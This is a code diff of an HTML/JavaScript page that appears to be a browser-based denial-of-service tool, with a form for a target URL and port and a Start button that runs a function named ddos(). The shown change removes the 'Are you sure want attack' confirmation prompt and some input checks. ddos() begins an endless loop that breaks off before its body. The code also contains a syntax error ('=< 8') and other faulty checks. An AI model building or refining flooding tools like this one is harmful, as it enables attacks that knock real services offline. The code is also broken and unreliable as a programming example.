@@ -67,35 +67,25 @@ border-radius: 4px;
 <input type="number" name="vport" id="targetport" placeholder="Input Port Target..." maxlength="5" required/>
 </p>
 <br>
-<button onclick="mulai();" class="start">Start</button>
+<button onClick="mulai();" class="start">Start</button>
 </center>
 </fieldset>
 <script>
 function mulai() {
-var targeturl = document.getElementById('targetnya').innerHTML;
-var port = document.getElementById('targetport').value;
-if (targeturl == null || targeturl == "" || targeturl.length =< 8) {
+var targeturl = document.getElementById('targetnya');
+var port = document.getElementById('targetport');
+if (targeturl.innerHTML == null || targeturl.innerHTML == "" || targeturl.length =< 8) {
 alert("Please Input Correctly");
-targeturl.innerHTML = "";
-return false;
 }
-else if (port == null || port == "") {
+else if (port.value == null || port.value == "" || port.length > 5) {
 alert("Please Input Correctly");
-port.innerHTML = "";
-return false;
 }
 else {
-var pilih = confirm('Are you sure want attack [' + targeturl + '] ?');
-if (pilih) {
 ddos();
-}
-else {
-return false;
-}
 }
 }
 function ddos() {
-var targeturl = document.getElementById('targetnya').innerHTML;
+var targeturl = document.getElementById('targetnya').value;
 var port = document.getElementById('targetport').value;
 while (true) {
 try {
